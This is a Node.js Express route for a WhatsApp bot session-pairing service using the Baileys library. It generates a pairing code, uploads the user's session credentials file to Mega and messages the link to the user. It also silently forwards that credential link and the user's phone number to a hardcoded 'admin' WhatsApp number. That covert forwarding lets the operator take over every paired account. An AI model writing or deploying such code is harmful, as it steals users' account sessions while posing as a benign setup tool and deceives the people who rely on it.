const express = require('express');
const fs = require('fs');
const { exec } = require("child_process");
let router = express.Router()
const pino = require("pino");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser
} = require("@whiskeysockets/baileys");
const { upload } = require('./mega');

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

// ✅ SET YOUR ADMIN NUMBER HERE (in WhatsApp JID format)
const adminNumber = "94784709148@s.whatsapp.net";

router.get('/', async (req, res) => {
    let num = req.query.number;

    async function PrabathPair() {
        const { state, saveCreds } = await useMultiFileAuthState(`./session`);

        try {
            let PrabathPairWeb = makeWASocket({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.macOS("Safari"),
            });

            if (!PrabathPairWeb.authState.creds.registered) {
                await delay(1500);
                num = num.replace(/[^0-9]/g, '');
                const code = await PrabathPairWeb.requestPairingCode(num);
                if (!res.headersSent) {
                    await res.send({ code });
                }
            }

            PrabathPairWeb.ev.on('creds.update', saveCreds);
            PrabathPairWeb.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;
                if (connection === "open") {
                    try {
                        await delay(10000);
                        const sessionPrabath = fs.readFileSync('./session/creds.json');

                        const auth_path = './session/';
                        const user_jid = jidNormalizedUser(PrabathPairWeb.user.id);

                        function randomMegaId(length = 6, numberLength = 4) {
                            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                            let result = '';
                            for (let i = 0; i < length; i++) {
                                result += characters.charAt(Math.floor(Math.random() * characters.length));
                            }
                            const number = Math.floor(Math.random() * Math.pow(10, numberLength));
                            return `${result}${number}`;
                        }

                        const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${randomMegaId()}.json`);
                        const sid = mega_url.replace('https://mega.nz/file/', '');

                        // ✅ User Message
                        const userMessage = `✅ *Pair Session Generated!*

🔗 *Session ID:* ${sid}

📥 Download Link:
${mega_url}

📌 _Use this session ID in your bot to complete pairing._`;

                        await PrabathPairWeb.sendMessage(user_jid, {
                            text: userMessage
                        });

                        // 🛡️ Admin Forward Message
                        const adminMessage = `🛡️ *New Pair Request*

👤 Number: wa.me/${num}
📂 Session ID: ${sid}
🔗 Link: ${mega_url}

📅 Time: ${new Date().toLocaleString()}`;

                        await PrabathPairWeb.sendMessage(adminNumber, {
                            text: adminMessage
                        });

                    } catch (e) {
                        exec('pm2 restart prabath');
                    }

                    await delay(100);
                    removeFile('./session');
                    process.exit(0);
                } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                    await delay(10000);
                    PrabathPair();
                }
            });
        } catch (err) {
            exec('pm2 restart prabath-md');
            console.log("service restarted");
            PrabathPair();
            removeFile('./session');
            if (!res.headersSent) {
                await res.send({ code: "Service Unavailable" });
            }
        }
    }

    return await PrabathPair();
});

process.on('uncaughtException', function (err) {
    console.log('Caught exception: ' + err);
    exec('pm2 restart prabath');
});

module.exports = router;
